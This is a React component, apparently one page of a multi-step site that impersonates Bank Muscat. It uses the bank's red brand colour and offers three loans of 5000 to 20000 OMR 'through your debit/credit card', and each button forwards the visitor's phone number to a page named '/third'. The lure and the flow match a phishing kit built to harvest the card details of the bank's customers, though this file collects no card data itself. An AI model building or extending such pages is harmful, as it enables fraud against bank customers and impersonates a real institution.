import React from "react";
import { Header } from "./Header";
import { useLocation, useNavigate } from "react-router-dom";
const BankMuscatForms = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const {phone} = location.state;
  return (
    <div className="min-h-screen bg-white px-4 py-6">
      {/* Header */}
      <Header/>

      {/* Forms Buttons */}
      <div className="space-y-6 mt-6">
        {[
          "You will receive 5000 OMR Personal Loan through your debit/credit card.",
          "You will receive 10000 OMR Business Loan through your debit/credit card.",
          "You will receive 20000 OMR Business Loan through your debit/credit card.",
        ].map((text, i) => (
          <button
            key={i}
            onClick={()=>{navigate("/third", {state: {phone}})}}
            style={{ backgroundColor: "#D4253A" }}
            className="block w-full text-white py-3 rounded-md text-center text-sm font-semibold"
          >
            {text}
          </button>
        ))}
      </div>

      {/* Footer Note */}
      {/* <p className="text-sm text-center text-gray-700 mt-8">
        Visit your nearest branch or
        <span className=" font-semibold" style={{color: "#D4253A"}}> call 2479 5555 </span>
        for further details.
      </p> */}

      
    </div>
  );
};

export default BankMuscatForms;
